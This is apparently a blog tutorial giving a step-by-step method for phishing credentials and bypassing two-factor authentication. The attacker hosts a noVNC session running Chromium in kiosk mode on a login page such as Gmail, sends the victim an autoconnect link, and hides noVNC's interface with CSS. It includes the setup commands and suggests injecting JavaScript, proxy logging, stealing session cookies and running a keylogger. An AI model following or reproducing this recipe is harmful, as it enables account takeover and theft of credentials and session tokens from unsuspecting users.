<h1 id="using-novnc-for-credential-acquisition-and-bypassing-2fa"><strong>Using noVNC for Credential Acquisition and Bypassing 2FA</strong></h1>

<p><strong>noVNC</strong> is both a <strong>JavaScript library for VNC clients</strong> and an application built on top of this library. Compatible with <strong>any modern browser</strong>, including mobile versions for iOS and Android, noVNC allows the web browser to function as a <strong>VNC client</strong>, enabling <strong>remote access to a machine</strong>.</p>

<p>So, how can we use noVNC to <strong>acquire credentials</strong> and <strong>bypass 2FA</strong>? Here’s the process:</p>

<ol>
  <li>Set up a server with noVNC.</li>
  <li>Start <strong>Chromium</strong> (or any other browser) in <strong>Kiosk mode</strong>.</li>
  <li>Direct it to the desired website for user authentication (e.g., <code class="language-plaintext highlighter-rouge">accounts.google.com</code>).</li>
  <li>Send the link to the target user. When they click the URL, they will access the <strong>VNC session</strong> without realizing it.</li>
  <li>Since Chromium is configured in <strong>Kiosk mode</strong>, the user experience will appear as a normal web page.</li>
</ol>

<hr />

<h2 id="exploitation-possibilities"><strong>Exploitation Possibilities</strong></h2>

<p>The exploitation possibilities of this method are <strong>vast</strong>:</p>

<ul>
  <li><strong>Inject JS</strong> into the browser.</li>
  <li>Use an <strong>HTTP proxy</strong> connected to the browser to log all activities.</li>
  <li><strong>Terminate the VNC session</strong> after user authentication.</li>
  <li>Capture the <strong>browser session token</strong> (Right-click &gt; Inspect &gt; Application &gt; Cookies) after the user disconnects.</li>
  <li>Run a <strong>background keylogger</strong>.</li>
  <li>Or <strong>get creative</strong> and find other approaches (remember, the server is yours).</li>
</ul>

<hr />

<h2 id="novnc-setup-and-demonstration"><strong>noVNC Setup and Demonstration</strong></h2>

<h3 id="1-deploy-a-kali-linux-instance"><strong>1. Deploy a Kali Linux Instance</strong></h3>

<p>Use any <strong>cloud service provider</strong> or deploy locally to set up a Linux machine. I will use <strong>Kali Linux</strong> for this demonstration because I prefer it, but you can choose any other Linux distribution you are comfortable with.</p>

<hr />

<h3 id="2-install-tigervnc"><strong>2. Install TigerVNC</strong></h3>

<p>First, you need to install <strong>VNC software</strong>. I tested two options: <strong>X11vnc</strong> and <strong>TigerVNC</strong>. After several tests, I chose to use <strong>TigerVNC</strong>.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt update
<span class="nb">sudo </span>apt <span class="nb">install </span>tigervnc-standalone-server tigervnc-xorg-extension tigervnc-viewer
</code></pre></div></div>

<hr />

<h3 id="3-set-up-a-vnc-password"><strong>3. Set Up a VNC Password</strong></h3>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vncpasswd
</code></pre></div></div>

<p>On Kali Linux, I didn’t need to create the <code class="language-plaintext highlighter-rouge">xstartup</code> file, but if you encounter any errors, you can configure it manually.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nano ~/.vnc/xstartup
</code></pre></div></div>

<p>Paste or write the following:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>
xrdb <span class="s2">"</span><span class="nv">$HOME</span><span class="s2">/.Xresources"</span>
xsetroot <span class="nt">-solid</span> grey
x-terminal-emulator <span class="nt">-geometry</span> 80x24+10+10 <span class="nt">-ls</span> <span class="nt">-title</span> <span class="s2">"</span><span class="nv">$VNCDESKTOP</span><span class="s2"> Desktop"</span> &amp;
x-window-manager &amp;
<span class="c"># Fix to make GNOME work</span>
<span class="nb">export </span><span class="nv">XKL_XMODMAP_DISABLE</span><span class="o">=</span>1
/etc/X11/Xsession
</code></pre></div></div>

<p>Add execution permissions:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod</span> +x ~/.vnc/xstartup
</code></pre></div></div>

<hr />

<h3 id="4-restart-the-vnc-server"><strong>4. Restart the VNC Server</strong></h3>

<p>Restart the VNC server, choosing the <strong>screen size settings</strong> according to your needs. noVNC automatically adjusts to the browser’s screen size, but do your own testing.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vncserver <span class="nt">-depth</span> 32 <span class="nt">-geometry</span> 1920x1080
</code></pre></div></div>

<hr />

<h3 id="5-download-and-run-novnc"><strong>5. Download and Run noVNC</strong></h3>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/novnc/noVNC.git
</code></pre></div></div>

<p>OR</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt <span class="nb">install </span>novnc
</code></pre></div></div>

<p>Now run noVNC <strong>locally</strong> or <strong>publicly</strong>. Here are the commands:</p>

<ul>
  <li><strong>Check the VNC server port:</strong></li>
</ul>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vncserver <span class="nt">-list</span>
</code></pre></div></div>

<p>Example: <code class="language-plaintext highlighter-rouge">5901</code>, <code class="language-plaintext highlighter-rouge">5902</code>, <code class="language-plaintext highlighter-rouge">5903</code>, etc.</p>

<ul>
  <li><strong>Run noVNC:</strong></li>
</ul>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./noVNC/utils/novnc_proxy <span class="nt">--vnc</span> localhost:5901
</code></pre></div></div>

<ul>
  <li><strong>Set up an SSH tunnel:</strong></li>
</ul>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-L</span> 6080:127.0.0.1:6080 root@server
</code></pre></div></div>

<ul>
  <li><strong>Run publicly using port 8081:</strong></li>
</ul>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ufw allow http
./noVNC/utils/novnc_proxy <span class="nt">--vnc</span> 0.0.0.0:5901 <span class="nt">--listen</span> 8081
</code></pre></div></div>

<hr />

<h3 id="6-access-vnc-and-run-the-browser-in-kiosk-mode"><strong>6. Access VNC and Run the Browser in Kiosk Mode</strong></h3>

<p>Access your VNC and run the browser in <strong>Kiosk mode</strong>. I used <strong>Chromium</strong>, but you can use whatever suits your needs.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chromium <span class="nt">--no-sandbox</span> <span class="nt">--app</span><span class="o">=</span>https://gmail.com <span class="nt">--kiosk</span>
</code></pre></div></div>

<hr />

<h3 id="7-send-the-url-to-the-victim-to-connect-automatically"><strong>7. Send the URL to the “Victim” to Connect Automatically</strong></h3>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:6080/vnc.html?autoconnect<span class="o">=</span><span class="nb">true</span>&amp;password<span class="o">=</span>YOUR-PASSWORD
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">autoconnect=true&amp;password=VNCPASSWORD</code> will make the user authenticate automatically. If you want to rename the query parameter, you can modify the <code class="language-plaintext highlighter-rouge">vnc.html</code> file.</p>

<hr />

<h3 id="8-modify-the-css-to-remove-visual-elements"><strong>8. Modify the CSS to Remove Visual Elements</strong></h3>

<p>noVNC displays a <strong>custom loading page</strong>, a <strong>VNC control bar</strong>, and some additional unnecessary visual elements that should be removed.</p>

<p>Open <code class="language-plaintext highlighter-rouge">vnc.html</code>, find the <code class="language-plaintext highlighter-rouge">divs</code> below, and add the CSS style shown.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- Hide unnecessary items --&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"noVNC_control_bar_anchor"</span> <span class="na">class=</span><span class="s">"noVNC_vcenter"</span> <span class="na">style=</span><span class="s">"display:none;"</span><span class="nt">&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"noVNC_status"</span> <span class="na">style=</span><span class="s">"display:none"</span><span class="nt">&gt;&lt;/div&gt;</span>

<span class="c">&lt;!-- Makes the loading page white --&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"noVNC_transition"</span> <span class="na">style=</span><span class="s">"background-color:white;color:white"</span><span class="nt">&gt;</span>
</code></pre></div></div>

<hr />

<h2 id="important-notes"><strong>Important Notes</strong></h2>

<ul>
  <li><strong>You are giving remote access to your machine!</strong> It should not have anything valuable stored on it.</li>
  <li>Any logged data should likely be sent to a <strong>remote machine</strong>.</li>
  <li><strong>Do not use the root account.</strong> Set up a restricted user account that uses the VNC service.</li>
  <li>Configure the <strong>Kiosk mode</strong> more restrictively.</li>
</ul>
